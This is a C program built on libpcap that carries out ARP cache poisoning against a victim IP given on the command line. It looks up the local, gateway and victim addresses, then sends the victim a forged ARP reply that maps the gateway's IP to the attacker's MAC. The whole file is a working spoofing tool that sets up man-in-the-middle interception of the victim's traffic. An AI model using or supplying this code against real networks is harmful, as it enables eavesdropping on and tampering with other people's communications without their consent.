#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <pthread.h>
#include <net/if.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <pcap.h>

#define ARPPACKETSIZE 28
#define MACADDRLEN 18
#define IPADDRLEN 16

#pragma pack(push, 1)
struct ETH_Header {
	unsigned char DstMACAddr[6];
	unsigned char SrcMACAddr[6];
	unsigned short EtherType;
#define ETHERTYPEIP  0x0800
#define ETHERTYPEARP 0x0806
};

struct ARP_Header {
	unsigned short HardwareType;
#define HWTETHERNET 1
	unsigned short ProtocolType;
#define PROTOTYPEIP 0x0800
	unsigned char HardwareAddressLength;
	unsigned char ProtocolAddressLength;
#define IPV4SIZE 4
#define MACSIZE 6
	unsigned short OperationCode;
#define OP_REQUEST 1
#define OP_REPLY   2
	unsigned char SourceHardwareAddress[6];
	unsigned int SourceProtocolAddress;
	unsigned char TargetHardwareAddress[6];
	unsigned int TargetProtocolAddress;
};

struct PACKET_Header {
	struct ETH_Header ETH_Packet;
	struct ARP_Header ARP_Packet;
};

struct IPMACADDR_Str {
	char MyMacAddr[MACADDRLEN];
	char VictimMacAddr[MACADDRLEN];
	char GatewayMacAddr[MACADDRLEN];
	char MyIpAddr[IPADDRLEN];
	char VictimIpAddr[IPADDRLEN];
	char GatewayIpAddr[IPADDRLEN];
};

struct IPMACADDR_Hex {
	unsigned char MyMacAddr[MACSIZE];
	unsigned char VictimMacAddr[MACSIZE];
	unsigned char GatewayMacAddr[MACSIZE];
	unsigned int MyIpAddr;
	unsigned int VictimIpAddr;
	unsigned int GatewayIpAddr;
};

struct args {
	char* device;
	unsigned char* DestMacAddr;
	unsigned int SourceIpAddr;
};
#pragma pack(pop)

bool GetMyIpAddr(char*, struct IPMACADDR_Hex*);
bool GetMyMacAddr(char*, struct IPMACADDR_Hex*);
bool GetMyGatewayIpAddr(char*, struct IPMACADDR_Hex*);
void SetDefaultARP(struct ARP_Header*, unsigned char*, unsigned int, unsigned char*, unsigned int, int);
void SetDefailtETH(struct ETH_Header*, unsigned char*, unsigned char*);
bool SendInfectionPacket(char*, struct IPMACADDR_Hex*);
void* RecvInfectionResponse(void*);
int main(int argc, char* argv[]) {
	unsigned int Net_Hex, Mask_Hex;
	char *device, errbuf[PCAP_ERRBUF_SIZE];
	struct IPMACADDR_Str IpMacAddrStr = { 0, };
	struct IPMACADDR_Hex IpMacAddrHex = { 0, };
	struct in_addr inaddr;

	if (argc < 2) {
		printf("Usage : %s <victim ip>\n", argv[0]);
		return -1;
	}

	// Get Network Interface Name
	device = pcap_lookupdev(errbuf);
	if (device == NULL) {
		printf("error in lookupdev()\n");
		printf("%s\n", errbuf);
		return -1;
	}
	printf("Network Interface : %s\n", device);

	// Get My IP Address
	if (GetMyIpAddr(device, &IpMacAddrHex) == false) {
		printf("Can't get my IP address\n");
		return -1;			
	}

	inaddr.s_addr = IpMacAddrHex.MyIpAddr;
	inet_ntop(AF_INET, &inaddr, IpMacAddrStr.MyIpAddr, IPADDRLEN);	// Convert to String

	// Get My MAC Address
	if (GetMyMacAddr(device, &IpMacAddrHex) == false) {
		printf("Can't get my MAC address\n");
		return -1;
	}

	for (int i = 0; i < MACSIZE; i++) 	// Convert to String
		sprintf(IpMacAddrStr.MyMacAddr, "%s%02x%s", IpMacAddrStr.MyMacAddr, IpMacAddrHex.MyMacAddr[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));

	// Get Gateway's IP Address	
	if (GetMyGatewayIpAddr(device, &IpMacAddrHex) == false) {
		printf("Can't get my Gateway IP address\n");
		return -1;
	}
 
	// Get Victim IP Address from argv[1]
	inaddr.s_addr = IpMacAddrHex.GatewayIpAddr;
	inet_ntop(AF_INET, &inaddr, IpMacAddrStr.GatewayIpAddr, IPADDRLEN);	// Convert to String

	// Print Information
	printf("My MAC Address : %s\n", IpMacAddrStr.MyMacAddr);
	printf("My IP Address : %s\n", IpMacAddrStr.MyIpAddr);
	printf("My Gateway IP Address : %s\n", IpMacAddrStr.GatewayIpAddr);

	strncpy(IpMacAddrStr.VictimIpAddr, argv[1], IPADDRLEN);
	IpMacAddrHex.VictimIpAddr = inet_addr(IpMacAddrStr.VictimIpAddr);	// Convert to Hex

	if (SendInfectionPacket(device, &IpMacAddrHex) == false) {
		printf("Cat't send ARP Infection Packet\n");
		return -1;
	}

	for (int i = 0; i < MACSIZE; i++)   // Convert to String
		sprintf(IpMacAddrStr.VictimMacAddr, "%s%02x%s", IpMacAddrStr.VictimMacAddr, IpMacAddrHex.VictimMacAddr[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));

	for (int i = 0; i < MACSIZE; i++)   // Convert to String
		sprintf(IpMacAddrStr.GatewayMacAddr, "%s%02x%s", IpMacAddrStr.GatewayMacAddr, IpMacAddrHex.GatewayMacAddr[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));

	printf("Gateway MAC Address : %s\n", IpMacAddrStr.GatewayMacAddr);
	printf("Victim MAC Address : %s\n", IpMacAddrStr.VictimMacAddr);

	return 0;
}

bool GetMyIpAddr(char* device, struct IPMACADDR_Hex* IpMacAddrHex) {
	struct ifaddrs* ifaddr, *ifa;
	struct sockaddr_in* inaddr;

	if (getifaddrs(&ifaddr) == -1) {
		perror("Error in getifaddrs()\n");
		exit(-1);
	}

	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
		if (ifa->ifa_addr == NULL) 
			continue;

		if ((strcmp(ifa->ifa_name, device) == 0) && (ifa->ifa_addr->sa_family == AF_INET)) {
			inaddr = (struct sockaddr_in*)ifa->ifa_addr;
			IpMacAddrHex->MyIpAddr = inaddr->sin_addr.s_addr;

			freeifaddrs(ifaddr);
			return true;
		}
	}

	freeifaddrs(ifaddr);
	return false;
}

bool GetMyMacAddr(char* device, struct IPMACADDR_Hex* IpMacAddrHex) {
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, device, strlen(device));

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
		memcpy(IpMacAddrHex->MyMacAddr, ifr.ifr_hwaddr.sa_data, MACSIZE);
		close(fd);

		return true;
	}
	close(fd);

	return false;
}

bool GetMyGatewayIpAddr(char* device, struct IPMACADDR_Hex* IpMacAddrHex) {
	char* interface = NULL, *Gateway = NULL;
	char line[100];
	FILE* fp;

	fp = fopen("/proc/net/route", "rt");
	if (fp == NULL) {
		printf("can't open /proc/net/route\n");
		return false;
	}

	while (fgets(line, 100, fp)) {
		interface = strtok(line, "\t");
		if (strcmp(interface, device) != 0) 
			continue;

		for (int i = 0; i < 2; i++) 
			Gateway = strtok(NULL, "\t");

		if (strcmp(Gateway, "00000000") == 0) 
			continue;

		break;
	}
	IpMacAddrHex->GatewayIpAddr = strtol(Gateway, NULL, 16);
	fclose(fp);

	return true;
}

void SetDefaultARP(struct ARP_Header* packet, unsigned char* SourceMACAddr, unsigned int SourceIPAddr, unsigned char* DestMACAddr, unsigned int DestIPAddr, int Operation) {
	packet->HardwareType = htons(HWTETHERNET);
	packet->ProtocolType = htons(PROTOTYPEIP);
	packet->HardwareAddressLength = MACSIZE;
	packet->ProtocolAddressLength = IPV4SIZE;
	packet->OperationCode = htons(Operation);
	for (int i = 0; i < MACSIZE; i++) 
		packet->SourceHardwareAddress[i] = SourceMACAddr[i];
	packet->SourceProtocolAddress = SourceIPAddr;
	for (int i = 0; i < MACSIZE; i++)
		packet->TargetHardwareAddress[i] = DestMACAddr[i];
	packet->TargetProtocolAddress = DestIPAddr;
}

void SetDefaultETH(struct ETH_Header* packet, unsigned char* SourceMACAddr, unsigned char* DestMACAddr) {
	for (int i = 0; i < MACSIZE; i++) 
		packet->DstMACAddr[i] = DestMACAddr[i];
	for (int i = 0; i < MACSIZE; i++) 
		packet->SrcMACAddr[i] = SourceMACAddr[i];
	packet->EtherType = htons(ETHERTYPEARP);
}

bool SendInfectionPacket(char* device, struct IPMACADDR_Hex* IpMacAddrHex) {
	unsigned char ETHBroadCasting[MACSIZE] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }, ARPBroadCasting[MACSIZE] = { 0x00, };
	unsigned char *GatewayMacAddr, *VictimMacAddr;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct PACKET_Header Packet_Victim, Packet_Gateway, Infection;
	struct args pThread_args;
	pthread_t pThread_Gateway, pThread_Victim;
	pcap_t* handle;

	SetDefaultARP(&Packet_Victim.ARP_Packet, IpMacAddrHex->MyMacAddr, IpMacAddrHex->MyIpAddr, ARPBroadCasting, IpMacAddrHex->VictimIpAddr, OP_REQUEST);
	SetDefaultARP(&Packet_Gateway.ARP_Packet, IpMacAddrHex->MyMacAddr, IpMacAddrHex->MyIpAddr, ARPBroadCasting, IpMacAddrHex->GatewayIpAddr, OP_REQUEST);
	SetDefaultETH(&Packet_Victim.ETH_Packet, IpMacAddrHex->MyMacAddr, ETHBroadCasting);
	SetDefaultETH(&Packet_Gateway.ETH_Packet, IpMacAddrHex->MyMacAddr, ETHBroadCasting);

	handle = pcap_open_live(device, BUFSIZ, 0, 1000, errbuf);
	if (handle == NULL) {
		printf("error in pcap_open_live()\n");
		printf("%s\n", errbuf);
		return false;
	}

	pThread_args.device = device;
	pThread_args.DestMacAddr = IpMacAddrHex->MyMacAddr;
	pThread_args.SourceIpAddr = IpMacAddrHex->GatewayIpAddr;
	if (pthread_create(&pThread_Gateway, NULL, RecvInfectionResponse, (void*)&pThread_args) < 0) {
		perror("pthread_create()");
		return false;
	}

	sleep(1);	// for thread

	if (pcap_sendpacket(handle, (unsigned char*)&Packet_Gateway, sizeof(struct PACKET_Header)) != 0) {
		perror("error in pcap_sendpacket()\n");
		return false;
	}
	pthread_join(pThread_Gateway, (void**)&GatewayMacAddr);	// wait thread
	memcpy(IpMacAddrHex->GatewayMacAddr, GatewayMacAddr, MACSIZE);

	pThread_args.SourceIpAddr = IpMacAddrHex->VictimIpAddr;
	if (pthread_create(&pThread_Victim, NULL, RecvInfectionResponse, (void*)&pThread_args) < 0) {
		perror("pthread_create()");
		return false;
	}

	sleep(1);	// for thread

	if (pcap_sendpacket(handle, (unsigned char*)&Packet_Victim, sizeof(struct PACKET_Header)) != 0) {
		perror("error in pcap_sendpacket()");
		return false;
	}
	pthread_join(pThread_Victim, (void**)&VictimMacAddr);	// wait thread
	memcpy(IpMacAddrHex->VictimMacAddr, VictimMacAddr, MACSIZE);

	SetDefaultARP(&Infection.ARP_Packet, IpMacAddrHex->MyMacAddr, IpMacAddrHex->GatewayIpAddr, IpMacAddrHex->VictimMacAddr, IpMacAddrHex->VictimIpAddr, OP_REPLY);
	SetDefaultETH(&Infection.ETH_Packet, IpMacAddrHex->MyMacAddr, IpMacAddrHex->VictimMacAddr);

	if (pcap_sendpacket(handle, (unsigned char*)&Infection, sizeof(struct PACKET_Header)) != 0) {
		perror("error in pcap_sendpacket()");
		return false;
	}

	return true;
}

void* RecvInfectionResponse(void* pThread_args) {
	unsigned char *DestMacAddr;
	char* device, errbuf[PCAP_ERRBUF_SIZE];
	unsigned int net, mask, SourceIpAddr;
	int ret;
	struct PACKET_Header* packet;
	struct bpf_program fp;
	pcap_pkthdr* pkthdr;
	pcap_t* handle;

	device = ((struct args*)pThread_args)->device;
	DestMacAddr = ((struct args*)pThread_args)->DestMacAddr;
	SourceIpAddr = ((struct args*)pThread_args)->SourceIpAddr;
	
	if (pcap_lookupnet(device, &net, &mask, errbuf) == -1) {
		printf("error in lookupnet()\n");
		printf("%s\n", errbuf);
		return (void*)-1;
	}

	handle = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);
	if (handle == NULL) {
		printf("error in pcap_open_live()\n");
		printf("%s\n", errbuf);
		return (void*)-1;
	}
	
	if (pcap_compile(handle, &fp, "ether proto \\arp", 0, net) == -1) {
		printf("compile error\n");
		return (void*)-1;
	}

	if (pcap_setfilter(handle, &fp) == -1) {
		printf("setfilter error\n");
		return (void*)-1;
	}

	while (1) {
		ret = pcap_next_ex(handle, &pkthdr, (const unsigned char**)&packet);
		if (ret == 0) 
			continue;
		else if (ret == -1) {
			perror("pcap_next_ex()");
			return (void*)-1;
		}
		
		if ((ntohs(packet->ARP_Packet.OperationCode) == OP_REPLY) && (packet->ARP_Packet.SourceProtocolAddress == SourceIpAddr)) 
			return (void*)packet->ARP_Packet.SourceHardwareAddress;
	}
	return (void*)-1;
}
